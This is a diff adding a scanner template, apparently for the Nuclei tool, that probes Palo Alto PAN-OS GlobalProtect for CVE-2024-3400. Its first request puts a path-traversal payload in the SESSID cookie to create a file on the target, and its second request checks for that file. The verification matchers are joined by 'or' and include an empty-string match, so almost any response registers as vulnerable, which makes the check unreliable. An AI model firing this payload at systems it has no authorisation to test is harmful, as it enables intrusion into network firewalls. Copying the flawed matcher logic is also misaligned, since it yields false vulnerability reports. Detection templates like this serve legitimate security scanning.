@@ -1,0 +1,47 @@
+id: palo-alto-pan-os-globalprotect-command-injection
+
+info:
+  name: Palo Alto Networks PAN-OS GlobalProtect Command Injection (CVE-2024-3400)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CVE-2024-3400,pan-os,command-injection
+
+variables:
+  t1: "{{rand_text_alpha(5)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-request
+    method: GET
+    path:
+      - "{{BaseURL}}/global-protect/login.esp"
+    headers:
+      Cookie: "SESSID=./../../../var/appweb/sslvpndocs/global-protect/portal/js/jq{{t1}}.min.js"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "GlobalProtect Portal"
+
+  - id: verification-request
+    method: GET
+    path:
+      - "{{BaseURL}}/global-protect/portal/js/jq{{t1}}.min.js"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: word
+        part: header
+        words:
+          - "403 Forbidden"
